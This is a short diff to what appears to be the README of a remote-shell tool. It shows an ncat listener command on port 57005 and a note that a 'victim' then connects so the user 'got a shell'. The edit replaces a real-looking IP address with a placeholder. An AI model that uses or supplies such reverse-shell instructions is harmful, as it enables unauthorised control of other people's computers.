@@ -20,9 +20,9 @@ You can access the shell by opening a port and hosting a ncat server
 ```cpp
 nc -lvp 57005
 ```
-Then it should say
+Then it should say (1.1.1.1 is a replacement ip it's the victims ip)
 ```yml
-Ncat: Connection from 46.165.252.184
+Ncat: Connection from 1.1.1.1
 ```
 Then press enter and you got a shell
 
